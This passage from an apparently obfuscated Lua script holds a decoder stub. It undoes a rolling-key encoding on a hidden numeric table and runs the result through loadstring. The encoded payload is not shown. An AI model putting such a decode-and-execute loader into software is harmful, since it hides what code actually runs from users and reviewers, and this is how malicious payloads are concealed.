    local function VM_lOI00(d, k, m)
        local R_1l10 = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_1l10, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_1l10)
    end

    -- Execution Guard
    local F_O1l111I = loadstring(VM_lOI00(B_OIl0I, 10, 5))
    if F_O1l111I then
        F_O1l111I(...)
    end
end)(...)
